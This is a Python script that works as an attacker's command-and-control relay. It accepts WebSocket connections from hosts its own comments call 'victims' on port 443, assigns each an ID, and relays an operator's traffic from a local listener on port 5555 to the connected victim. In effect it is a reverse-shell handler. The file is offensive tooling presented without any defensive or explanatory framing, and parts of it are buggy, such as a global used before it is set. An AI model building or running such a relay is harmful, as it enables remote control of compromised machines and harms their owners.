import websockets
import asyncio
import uuid

# Store connected victims.
victim_list = {}


# Handle victim side connection.
async def victim_handle(websocket):
    global victim
    victim = websocket

    # Store victim's connected ip and port.
    ip, port = websocket.remote_address

    # Assign a UUID to victim.
    victim_id = str(uuid.uuid4())
    victim_list[victim_id] = websocket  # Assign websocket to UUID.
    print(victim_id)

    print(f'[+] Victim {ip}:{port} connected')

    try:
        async for msg in websocket:

            if reader:
                writer.write(msg)
                await writer.drain()

    except websockets.exceptions.ConnectionClosed:
        print('[+] Victim disconnected!')
        victim_list.pop(victim_id)


# Handle listener side connection.
async def listener_handle():

    # Use to transfer data to victim side.
    async def data_transfer(read, write):

        global reader
        global writer

        reader = read
        writer = write
        addr = writer.get_extra_info('peername')
        print(f'[+] Listener {addr} connected')

        try:
            while True:

                data = await reader.read(10000000000)

                if not data:
                    break

                await victim.send(data)

        except websockets.exceptions.ConnectionClosed:
            print('[+] Listener disconnected!')

    server = await asyncio.start_server(data_transfer, '0.0.0.0', 5555)

    async with server:
        await server.serve_forever()


# Handle both victim and listener connections.
async def main():

    # Use to run victim and listener handle asynchronously.
    await asyncio.gather(websockets.serve(victim_handle, '0.0.0.0', 443), listener_handle())

asyncio.run(main())
